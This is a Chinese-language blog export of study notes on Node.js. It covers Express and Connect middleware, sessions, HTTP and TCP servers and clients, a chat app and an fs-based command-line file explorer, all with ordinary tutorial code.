res.render('search', &#123; results: tweets, search: req.query.q &#125;); &#125;)&#125;) 最终的server123456789101112131415161718192021222324252627282930313233343536373839404142/** * 模块依赖 */var express = require('express');var search = require('./search');//创建服务var app = express();//指定模板引擎app.set('view engine', 'ejs');//指定视图文件所在的路径app.set('views', __dirname + '/views');//视图文件选项app.set('view options', &#123; layout: false &#125;);/** * 路由 */app.get('/', function (req, res) &#123; /* Express为response对象提供了render方法，该方法完成了下面的三件事: 1. 初始化模板引擎 2. 读取视图文件并将其传递给模板引擎 3. 获取解析后的HTML页面并作为响应发送给客户端 */ res.render('index');&#125;)app.get('/search', function (req, res, next) &#123; search(req.query.q, function (err, tweets) &#123; //如果报错就把错传递下去 if (err) return next(err); //render给ejs传参(json)，这里的变量成为本地变量，因为其内容只对其传递的视图可见 res.render('search', &#123; results: tweets, search: req.query.q &#125;); &#125;)&#125;)/** * 监听 */app.listen(3000); 查询search.js 12345678910111213141516171819202122/** * Search function. * * @param (String) search query * @param (Function) callback * @api public */var request = require('superagent');module.exports = function search(query, fn) &#123; request.get('http://search.twitter.com/search.json') .send(&#123; q: query &#125;) .end(function (res) &#123; if (res.body &amp;&amp; Array.isArray(res.body.results)) &#123; //如果superagent获取到了json格式的信息，他会自动解码放到body中 return fn(null, res.body.results); &#125; else &#123; fn(new Error('Bad twitter response')); &#125; &#125;)&#125; 一些express设置 缓存模板引擎 1app.enable('view cache', true); 模板引擎 Haml Jade ejs CoffeeKup jQuery Templates for node 错误处理 将错误参数通过next传递下去，通常express会展示一个错误页面并且发送500状态码 自定义错误处理 12345678910// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error'); &#125;); 方便的函数request 1req.header(sth); //返回头部的信息 e.g: 1console.log(req.header('HoSt')); //不区分大小写 1req.accepts('text/html'); //分析请求中的Accept头信息，根据值返回true / false 1req.is('text/html'); //与accepts类似，但是它会检查Content-Type头信息 response 1res.render(filename); //渲染文件，路径在views设置中( app.set('views', __dirname + '/views'); ) 12345//经测试，响应会在send之后结束res.send(Number); //发送状态码res.send(Object); //发送对象(被解析为JSON字符串)res.send(Array); //发送数组(被解析为字符串)res.send(String); //发送字符串 1res.redirect(path(, Number)); //等效于发送302状态码以及Location头信息，第二个参数允许自己设置状态码 路由 路由传参，变量被注入到req.params中 123app.get('/example/:name', function (req, res, next) &#123; res.send(req.params.name);//字符串类型&#125;); 还可以加问号表示可选 123app.get('/example/:name?', function (req, res, next) &#123; res.send(req.params.name);//字符串类型&#125;); 还可以使用RegExp对象(正则表达式)进行匹配 123app.get( /^\\/post\\/([a-z\\d\\-]*)/ , function (req, res, next) &#123; res.send('success');&#125;); 在路由中使用next，可以跳过这个路由，让其他路由进行处理 123456app.get('/search/:name', function (req, res, next) &#123; if(req.params.name == \"f**k\") return next();&#125;);app.get('/search/f**k', function (req, res, next) &#123; //do sth if the route is /search/f**k&#125;); 同时也可以next(err)来传递错误 在中间件中使用next(&#39;route&#39;)，可以确保当前路由被跳过 中间件 1app.use(func); 1234567891011//在特定的路由中使用中间件function secure (req, res, next) &#123; //do sth&#125;app.get('/financials', secure, function (req, res, next) &#123; //do sth&#125;);//也可以定义多个中间件app.get('/route', a, b, c, function(req, res, next) &#123; //do sth&#125;); 代码组织策略 模块化 -第一准则 维护一个server.js文件，该文件包含了路由表，同时将每一部分路由处理器都通过模块化的方式引入 app挂载 将整个express的app作为一个模块，并且挂载到现有应用中 var app = module.exports = express() e.g: //blog.js中 var app = module.exports = require('express')(); /** * 路由 */ app.get('/', function (req, res, next) { //do sth }) app.get('/categories', function (req, res, next) { //do sth }) app.get('/search', function (req, res, next) { //do sth }) &lt;!--￼23--&gt;","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"8.connect","date":"2020-09-29T11:13:24.000Z","path":"2020/09/29/coding/nodeJs/8. connect 中间件/","text":"connect 基于HTTP服务器的工具集，提供了一种新的组织代码的方式来与请求，响应对象进行交互，称中间件(middleware) 比较-原生http与connect 原生http 1234567891011121314151617181920212223242526var http = require('http'), fs = require('fs');var server = http.createServer(function (req, res) &#123; if ('GET' == req.method &amp;&amp; '/images' == req.url.substr(0, 7) &amp;&amp; '.jpg' == req.url.substr(-4)) &#123; fs.stat(__dirname + req.url, function (err, stat) &#123; if (err || !stat.isFile()) &#123; res.writeHead(404); res.end('Not Found'); return; &#125; serve(__dirname + req.url, 'application/jpg', res); &#125;); &#125; else if ('GET' == req.method &amp;&amp; '/' == req.url) &#123; serve(__dirname + '/index.html', 'text/html', res); &#125; else &#123; res.writeHead(404); res.end('Not Found'); &#125;&#125;)function serve(path, type, res) &#123; res.writeHead(200, &#123; 'Content-Type': type &#125;); //HTTP响应对象是只写的，从文件创建出来的流是只读的 fs.createReadStream(path).pipe(res);&#125;server.listen(3000); connect package.json 1234567&#123; \"name\": \"my-website\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"connect\": \"*\" &#125;&#125; 代码 1234567891011121314151617181920212223/** * 模块依赖 *///书上的是旧版的connect( &lt; 3.0.0)的使用方法，自己摸索出了新版的使用方法var connect = require('connect');var serveStatic = require('serve-static')/** * 创建服务器 */var server = connect();/** * 处理静态文件 *///通过use方法添加static中间件//e.g:使用127.0.0.1:3000/images/example4.jpg访问./website/images/example4.jpgserver.use(serveStatic(__dirname + '/website'));/** * 监听 */server.listen(3000);//Connect还可以自己处理404的情况 设计一个更大型的应用需求 记录请求处理时间 托管静态文件 处理授权 代码1234567891011121314151617181920212223242526272829303132333435var server = require('connect')();//在中间件同时处理路由，返回数据，兼当控制器的作用//一些地方没有具体实现server.use(function (req, res, next) &#123; //记录日志 console.error(' %s %s ', req.method, req.url); next();&#125;);server.use(function (req, res, next) &#123; if('GET' == req.method &amp;&amp; '/images' == req.url.substr(0, 7)) &#123; //托管图片 &#125; else &#123; //交给其他中间件处理 next(); &#125;&#125;);server.use(function (req, res, next) &#123; if('GET' == req.method &amp;&amp; '/' == req.url) &#123; //响应index.html文件 &#125; else &#123; //交给其他中间件处理 next(); &#125;&#125;);server.use(function (req, res, next) &#123; //最后一个中间件，如果到了这里，就意味着无能为力，返回404 res.writeHead(404); res.end('Not Found');&#125;);server.listen(3000); 中间件-编写可重用的中间件 一个用于当请求时间过长而进行警告的中间件 request-time.js 暴露一个函数，暴露的函数本身返回一个函数 - 一个对于可配置的中间件来说很常见的写法 框架 12345678910111213141516/** * 请求时间中间件 * * 选项： * -'time'('Number')：超时阈值(默认100ms) * * @param &#123;Object&#125; options * @api public */module.exports = function (opts) &#123; // ... return function(req, res, next) &#123; //... next(); &#125;&#125; 实现12345678910111213141516171819202122232425262728/** * 请求时间中间件 * * 选项： * -'time'('Number')：超时阈值(默认100ms) * * @param &#123;Object&#125; options * @api public */module.exports = function (opts) &#123; var time = opts.time || 100; return function (req, res, next) &#123; var timer = setTimeout(function () &#123; console.log('\\033[90m%s %s\\033[39m \\033[91mis taking too long!\\033[39m', req.method, req.url); &#125;, time); //这个技巧称为 重写方法/猴子补丁(monkey-patch) //将原本的方法置换为包含原本方法的函数，在其他的地方调用这个被置换过的方法时，被置换的方法方法可以在执行原来方法的同时执行一些别的方法 var end = res.end; res.end = function (chunk, encoding) &#123; res.end = end; res.end(chunk, encoding); clearTimeout(timer); &#125;; next(); &#125;;&#125;; 测试123456789101112131415161718192021222324252627282930313233343536373839var connect = require('connect');var time = require('./request-time');var morgan = require('morgan');var fs = require('fs');var app = connect();// create a write stream (in append mode)var accessLogStream = fs.createWriteStream(__dirname + 'access.log', &#123; flags: 'a' &#125;); // setup the loggerapp.use(morgan('combined', &#123; stream: accessLogStream &#125;));app.use(time(&#123;time: 500&#125;));/** * 快速响应 */app.use(function(req, res, next) &#123; if('/a' == req.url) &#123; res.writeHead(200); res.end('Fast!'); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if('/b' == req.url) &#123; setTimeout(function () &#123; res.writeHead(200); res.end('Slow!'); &#125;, 1000); &#125; else &#123; next(); &#125;&#125;);app.listen(3000); 中间件-举例static(现在改名为serve-static) static允许将任意一个url匹配到文件系统中任意一个目录 1server.use(serveStatic(__dirname + 'website')); // app.use() 这种起名方式貌似比较好 自己测试发现，托管是动态托管，非常nb 参数 maxAge 一个资源在客户端缓存的时间(ms)，在此期间内文件内容将被缓存起来，改动则不会被再缓存 query中间件 现在已经被qs(querystring)替代，默认在express中启用 logger中间件 将发送进来的请求和发送出去的响应信息打印在终端(可配置打印在日志文件中) 1server.use(logger('dev')); body parser中间件 书上的方法已经过时，这里是自己探索出的使用方法 123456789101112131415161718192021222324252627//部分代码,已经测试过可行var bodyParser = require('body-parser');var jsonParser = bodyParser.json();var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);//可以x-www-form-urlencoded，也就是表单数据var app = connect();app.use(urlencodedParser);app.use(function (req, res, next) &#123; if (req.url == '/x-www-form-urlencoded' &amp;&amp; req.method == 'POST') &#123; console.log(req.body); res.writeHead(200); res.end('success'); &#125; else &#123; next(); &#125;&#125;);app.use(jsonParser);app.use(function (req, res, next) &#123; if (req.url == '/raw-json' &amp;&amp; req.method == 'POST') &#123; console.log(req.body); res.writeHead(200); res.end('success'); &#125; else &#123; next(); &#125;&#125;); 会话(session)json文件 123456&#123; \"tobi\": &#123; \"password\":\"ferret\", \"name\": \"Tobi Holowaychuk\" &#125;&#125; 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687var connect = require('connect'), users = require('./users.json'), logger = require('morgan'), bodyParser = require('body-parser'), cookieParser = require('cookie-parser'), session = require('express-session');//这里直接Require了json文件，当你对外暴露数据时，不需要加上module.exports，直接把数据以json形式暴露出来就可以了(技巧-暴露数据可以用json文件)var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);var app = connect();app.use(urlencodedParser);app.use(logger('dev'));app.use(cookieParser());app.use(session(&#123; secret: \"my app secret\", resave: true, saveUninitialized: true//这里一定要加上去，否则会存不住session&#125;));app.use(function (req, res, next) &#123; if ('/' == req.url &amp;&amp; req.session.logged_in) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end('Welcome back, &lt;b&gt;' + req.session.name + '&lt;b&gt;' + '&lt;a href = \"/logout\"&gt;Logout&lt;/a&gt;'); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/' == req.url &amp;&amp; 'GET' == req.method) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end([ '&lt;form action = \"/login\" method = \"post\"&gt;', '&lt;fieldset&gt;', '&lt;legend&gt;please log in&lt;/legend&gt;', '&lt;p&gt;user: &lt;input type=\"text\" name=\"user\"&gt;&lt;/p&gt;', '&lt;p&gt;password: &lt;input type=\"password\" name=\"password\"&gt;&lt;/p&gt;', '&lt;button&gt;Submit&lt;/button&gt;', '&lt;fieldset&gt;', '&lt;/form&gt;' ].join('')); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/login' == req.url &amp;&amp; 'POST' == req.method) &#123; res.writeHead(200); console.log(req.body); console.log(users); if (!users[req.body.user] || req.body.password != users[req.body.user].password) &#123; res.end('Bad username/password'); &#125; else &#123; //注意是req //该对象的session在响应发送出去时会自动保存，无需手动处理 req.session.logged_in = true; req.session.name = users[req.body.user].name; res.end('Authenticated!'); console.log(req.session.name); &#125; &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/logout' == req.url &amp;&amp; req.method == 'GET') &#123; console.log(req.session.name); if (req.session.logged_in) &#123; req.session.logged_in == false; res.writeHead(200); res.end('logged out!'); &#125; else &#123; res.writeHead(200); res.end('Have not logged!'); &#125; &#125; else &#123; next(); &#125;&#125;);app.listen(3000); Redis session 将session存入数据库，将session脱离进程 12345678910var redis = require('redis');//持久化存储var RedisStore = require('connect-redis')(session);//持久化存储var redisClient = redis.createClient();//持久化存储app.use(session(&#123; store: new RedisStore(&#123;client: redisClient&#125;),//持久化存储 secret: \"my app secret\", resave: false, saveUninitialized: true//这里一定要加上去，否则会存不住session&#125;)); basicAuth中间件 对客户端进行基本的身份验证 e.g:一个简单的身份验证系统 12","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"7.HTTP --TCP上层的超文本传输协议","date":"2020-09-29T11:12:24.000Z","path":"2020/09/29/coding/nodeJs/7. HTTP/","text":"HTTP –TCP上层的超文本传输协议HTTP结构 12345require('http').createServer(function (req, res) &#123; res.writeHead(200); res.end('Hello World');&#125;).listen(3000); 1234567HTTP / 1.1 200 OKDate: Mon, 31 Aug 2020 22: 57: 14 GMTConnection: keep - aliveTransfer - Encoding: chunkedbHello World0 头信息 “Content-Type” 文本类型：text/plain 普通文本 text/html 富文本 “Transfer-Encoding” 头信息默认值 chunked(使得响应逐步产生) “Connection” 连接状态 keep-alive 保持连接，不用重复连接TCP 流 管道 的应用(两者等效) require('fs').createReadStream('image.png').pipe(res); &lt;!--￼2--&gt; 连接 TCP连接：connection对象 http连接：req, res对象 在http连接中获取tcp连接：req.connection(不常用) 处理用户提交的表单 创建模块 12345&#123; \"name\": \"http-form\", \"description\": \"An HTTP server that processes forms\", \"version\": \"0.0.1\"&#125; 表单 123456789101112131415161718require('http').createServer(function (req, res) &#123; if('/' == req.url) &#123; res.writeHead(200, &#123;\"Content-Type\": \"text/html\"&#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url) &#123; res.writeHead(200, &#123;'Content-Type': \"text/html\"&#125;); res.end('You sent a &lt;em?&gt;' + req.method + '&lt;/em? request'); &#125;&#125;).listen(3000); method 123456789101112131415161718192021222324require('http').createServer(function (req, res) &#123; if ('/' == req.url) &#123; res.writeHead(200, &#123; \"Content-Type\": \"text/html\" &#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url &amp;&amp; 'POST' == req.method) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200, &#123; 'Content-Type': \"text/html\" &#125;); res.end('&lt;p&gt;Content-Type: ' + req.headers['content-type'] + '&lt;/p&gt;' + '&lt;p&gt;Data: &lt;/p&gt;&lt;pre&gt;' + body + '&lt;/pre&gt;'); &#125;); &#125;&#125;).listen(3000); url querystring对url进行处理 12console.log(require('querystring').parse('name=Guillermo'));console.log(require('querystring').parse('q=guillermo+rauch')); 12[Object: null prototype] &#123; name: &apos;Guillermo&apos; &#125;[Object: null prototype] &#123; q: &apos;guillermo rauch&apos; &#125; 整合12345678910111213141516171819202122232425262728293031var qs = require('querystring');require('http').createServer(function (req, res) &#123; if ('/' == req.url) &#123; res.writeHead(200, &#123; \"Content-Type\": \"text/html\" &#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url &amp;&amp; 'POST' == req.method) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200, &#123; 'Content-Type': \"text/html\" &#125;); //使用querystring处理 res.end('&lt;p&gt;Your name is &lt;b&gt;' + qs.parse(body).name + '&lt;/b&gt;&lt;/p&gt;'); &#125;); &#125; else &#123; //404处理 res.writeHead(404); res.end('Not Found'); &#125;&#125;).listen(3000); 一个Twitter Web客户端 创建模块 123456&#123; \"name\": \"tweet-client\", \"description\": \"An HTTP tweets client\", \"version\": \"0.0.1\"&#125; 发送一个简单的http请求123456789101112131415require('http').request(&#123;//初始化一个新的http.Client Request对象 host: '127.0.0.1', port: 3000, url: '/', method: 'GET'&#125;, function (res) &#123; var body = \"\"; res.setEncoding('utf8'); res.on('data', function (chunk) &#123; body += chunk; &#125;); res.on('end', function() &#123; console.log('\\r\\n We got: \\033[96m' + body + '\\033[39m\\r\\n'); &#125;)&#125;).end();//调用end(): 原因是创建完一个请求之后，在发送给服务器前还可以和request对象进行交互 1We got: &lt;form method=&quot;POST&quot; action=&quot;url&quot; &lt;h1&gt;My form&lt;/h1&gt;&lt;fieldset&gt;&lt;label&gt;Personal information&lt;/label&gt;&lt;p&gt;What is your name?&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;&lt;/form&gt; 模拟一次请求 服务端 1234567891011121314var qs = require('querystring');require('http').createServer(function (req, res) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200); res.end('done'); console.log('\\r\\n got name \\033[90m' + qs.parse(body).name + '\\033[39m\\r\\n'); &#125;);&#125;).listen(3000); 客户端 12345678910111213141516171819202122232425262728var http = require('http');var qs = require('querystring');function send(theName) &#123; http.request(&#123; host: '127.0.0.1', port: 3000, url: '/', method: 'POST' &#125;, function (res) &#123; res.setEncoding('utf8'); //自己注册的事件，end事件在测试中发现需要先注册data事件 res.on('data', function (data) &#123; console.log(\"Data: \" + data); &#125;) res.on('end', function () &#123; console.log('\\r\\n \\033[90m request complete!\\033[39m'); process.stdout.write('\\r\\n your name: '); &#125;); &#125;).end(qs.stringify(&#123;name: theName&#125;));&#125;process.stdout.write('\\r\\n your name: ');process.stdin.resume();process.stdin.setEncoding('utf-8');process.stdin.on('data', function (name) &#123; send(name.replace('\\n', ''));&#125;) 获取推文123456789101112131415161718192021222324252627var qs = require('querystring');var http = require('http');var search = process.argv.slice(2).join(' ').trim();if (!search.length) &#123; return console.log('\\r\\n Usage: node tweets &lt;search term&gt;\\r\\n');&#125;console.log('\\r\\n searching for: \\033[96m' + search + '\\033[39m\\r\\n');http.request(&#123; //also http.get(obj, func);(这种方法不用.end()) host: 'search.twitter.com', path: '/search.json?' + qs.stringify(&#123; q: search &#125;)&#125;, function (res) &#123; var body = ''; res.setEncoding('utf8'); res.on('data', function (chunk) &#123; body += chunk; &#125;); res.on('end', function () &#123; var obj = JSON.parse(body); obj.results.forEach(function (tweet) &#123; console.log(' \\033[90m' + tweet.text + '\\033[39m'); console.log(' \\033[94m' + TreeWalker.from_user + '\\033[39m'); console.log('--'); &#125;); &#125;);&#125;).end(); superagent(客户端) 1npm install superagent 1234var request = require('superagent');request.get('http://twitter.com/search.json') .send(&#123; q: 'justin bieber' &#125;) .end(function (res) &#123; console.log(res.body) &#125;);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"6.TCP服务器","date":"2020-09-29T11:11:24.000Z","path":"2020/09/29/coding/nodeJs/6. TCP服务器 在线聊天应用/","text":"TCP服务器 创建TCP服务器 使用telnet测试创建1234require('http').createServer(function (req, res) &#123; res.writeHead(200, &#123;'Content-Type': 'text/html'&#125;); res.end('&lt;h1&gt;hello world&lt;/h1&gt;');&#125;).listen(3000); 测试1234567891011121314telnet 127.0.0.1 3000(ctrl + ] 接回车)GET / HTTP / 1.1HTTP / 1.1 200 OKContent - Type: text / htmlDate: Mon, 31 Aug 2020 01: 42: 05 GMTConnection: keep - aliveTransfer - Encoding: chunked14&lt;h1&gt; hello world&lt;/h1&gt;0 一个聊天应用需求 成功连接到服务器后，服务器会显示欢迎信息，并要求输入用户名，同时还会告诉你当前还有多少其他客户端也连接到了服务器 输入用户名，按下回车后，即认为已经连接上了服务器 连接之后，输入信息按下回车，向其他客户端进行消息的收发 按下回车相当于输入了 \\n 字符，在node服务器端，通过\\n来判断消息是否已完全到达 创建模块12345&#123; \"name\": \"tcp-chat\", \"description\": \"Our first TCP server\", \"version\": \"0.0.1\"&#125; 创建服务器12345678910111213141516171819/** * 模块依赖 */ var net = require('net'); /** * 创建服务器 */ var server = net.createServer(function (conn) &#123; //handle connection console.log('\\033[90m new connection!\\033[39m'); &#125;) /** * 监听 */ server.listen(3000, function()&#123; console.log('\\033[96m server listening on *:3000\\033[39m'); &#125;) 接收连接1234567891011121314151617181920212223var count = 0;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\n &gt; ' + count + ' other people are connected at this time.' + '\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); conn.on('data', function (data) &#123; //如果没有设置编码，接收到的数据将会是一个Buffer console.log(data); &#125;) //底层套接字关闭时，Node.js会触发close事件(end事件：当客户端显示关闭TCP连接时触发，当发生error事件时end事件不会触发，不过发生error / end事件时close事件都会触发) conn.on('close', function () &#123; count--; &#125;);&#125;); 创建用户数组，添加通知1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * 模块依赖 */var net = require('net');//count计数器称为状态，在本例中，两个不同连接的用户需要修改同一个状态变量，这时称为共享状态的并发var count = 0, users = &#123;&#125;;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\n &gt; ' + count + ' other people are connected at this time.' + '\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); //昵称 var nickname; conn.on('data', function (data) &#123; if(!nickname) &#123; //第一份输入的数据是nickname if(users[data]) &#123; conn.write('\\033[930&gt; nickname already in use. try again:\\033[39m '); return; &#125; else &#123; nickname = data; users[nickname] = conn; for(var i in users) &#123; users[i].write('\\033[90m &gt; ' + nickname + ' joined the room\\033[39m\\n'); &#125; &#125; &#125; else &#123; for(var i in users) &#123; if(i != nickname) &#123; //消息通知其他人 users[i].write('\\033[96m &gt; ' + nickname + ':\\033[39m ' + data + '\\n'); &#125; &#125; &#125; &#125;) conn.on('close', function () &#123; count--; &#125;);&#125;);/** * 监听 */server.listen(3000, function () &#123; console.log('\\033[96m server listening on *:3000\\033[39m');&#125;) 完成1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * 模块依赖 */var net = require('net');var count = 0, users = &#123;&#125;;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\r\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\r\\n &gt; ' + count + ' other people are connected at this time.' + '\\r\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); var nickname; //发现data事件在自己这里是一个字符一个字符输出的，所以就做了个存储 var data = \"\"; conn.on('data', function (chunk) &#123; if (chunk === \"\\r\\n\") &#123; if (!nickname) &#123; if (users[data]) &#123; conn.write('\\033[930&gt; nickname already in use. try again:\\033[39m '); return; &#125; else &#123; nickname = data; users[nickname] = conn; broadcast('\\033[90m &gt; ' + nickname + ' joined the room\\033[39m\\r\\n', nickname); &#125; &#125; else &#123; broadcast('\\033[96m &gt; ' + nickname + ':\\033[39m ' + data + '\\r\\n', nickname, true); &#125; data = \"\"; &#125; else &#123; data += chunk; &#125; &#125;) conn.on('close', function () &#123; count--; delete users[nickname]; broadcast('\\033[96m &gt; ' + nickname + ' left the room\\033[39m\\r\\n', nickname); &#125;);&#125;);function broadcast(msg, nickname, exceptMyself = false) &#123; for (var i in users) &#123; if (!exceptMyself || i != nickname) &#123; users[i].write(msg); &#125; &#125;&#125;/** * 监听 */server.listen(3000, function () &#123; console.log('\\033[96m server listening on *:3000\\033[39m');&#125;) 一个IRC(Internet Relay Chat)客户端程序突然发现一个神奇的快捷键–VS CODE ctrl + shift + C，调出cmd 创建模块12345 &#123; \"name\": \"irc-client\", \"description\": \"Our first TCP client\", \"version\": \"0.0.1\"&#125; 理解NET#STREAM API 1net.connect(port, [[, host], callback]); 1234567//e.g.: net.connect(3000, 'localhost', function () &#123; &#125;);/* EQUAL TOvar client = net.connect(3000, 'localhost');client.on(\"connect\", function () &#123; &#125;);//同样可以监听data与close事件*/ 完成123456789var net = require('net');var client = net.connect(6667, 'irc.freenode.net');client.setEncoding('utf-8');client.on('connect', function() &#123; client.write('NICK mynick\\r\\n'); client.write('USER mynick 0 * :realname\\r\\n'); client.write('JOIN #node.js\\r\\n');&#125;);console.log(client);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"5.CLI以及FS API","date":"2020-09-29T11:10:24.000Z","path":"2020/09/29/coding/nodeJs/5. CLI以及FS API 第一个node.js程序 - 命令行程序/","text":"NODE.JS 为什么要记这个笔记？ 在以前的实战项目中，发现自己的忘性很大，经常忘记函数名以及使用方法，所以在这次的node.js学习之路中，想记一点笔记以自用。 记些什么？ 不记基础和起步内容，记一些重要的模块的api函数以及用法，以及一些JavaScript的巧妙用法。 所采用的书籍？ 《了不起的Node JS 将JavaScript进行到底》 补： 此系列与2020年9月初编写，本想使用node搭建一个项目再发布这些文章，奈何写出来自觉没有hexo的主题好看，因此自行删除不是，打算之后把我的项目展示出来以供参考。 CLI以及FS API 第一个node.js程序 - 命令行程序 需求1. 程序在命令行运行，意味着程序要么通过node命令运行，要么直接执行，通过终端提供交互给用户进行输入输出。 2. 启动后需要显示当前目录的列表 3. 选取某个文件后，显示该文件的内容 4. 选择某个目录后，显示该目录下的信息 5. 运行结束后程序退出 步骤 创建模块 决定使用同步/异步fs 流(stream) 实现输入输出 重构 使用fs进行文件交互 完成 开始声明一个自己的项目(package.json) 12345&#123; \"name\": \"file-explorer\", \"version\": \"0.0.1\", \"description\": \"A command-file file explorer!\"&#125; fs模块 引入(fs是模块唯一一个同时提供异步和同步API的模块) 1234var fs = require('fs');fs.readdir(__dirname, function (err, files) &#123; console.log(files); &#125;); 第一份代码(从显示文件/目录到输入操作)123456789101112131415161718192021222324252627282930313233var fs = require('fs');fs.readdir(process.cwd(), function (err, files) &#123; console.log('');//为了输出更加友好，首先输出一个空行 if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n');//\\033[31m 与 \\033[39m 是为了让文本呈现为红色 &#125; console.log(' Select which file or directory you want to see\\n'); //第一种异步流控制模式-串行 function file(i) &#123; var filename = files[i]; fs.stat(__dirname + '/' + filename, function (err, stat) &#123;//fs.stat会给出文件/目录元数据 if (stat.isDirectory()) &#123;//目录与文件的颜色不同 console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; i++; if (i == files.length) &#123;//没有未处理的文件 console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m');//console.log是这个函数的封装，多了个换行符 process.stdin.resume();//等待用户输入 process.stdin.setEncoding('utf8');//设置流编码为utf8 //... &#125; else &#123; file(i); &#125; &#125;); &#125; file(0);&#125;); 重构一下12345678910111213141516171819202122232425262728293031323334353637383940414243var fs = require('fs'), stdin = process.stdin, stdout = process.stdout, files = [], filename; function file(i) &#123; //过多嵌套会使得程序可读性变差，因此分离出函数 filename = files[i]; fs.stat(__dirname + '/' + filename, function(err, stat) &#123; if(stat.isDirectory()) &#123; console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; if(++i == files.length) &#123; //递归结束调用read读取 read(); &#125; else &#123; file(i); &#125; &#125;); &#125; function read() &#123; console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m'); process.stdin.resume(); process.stdin.setEncoding('utf8'); //... &#125; fs.readdir(process.cwd(), function (err, 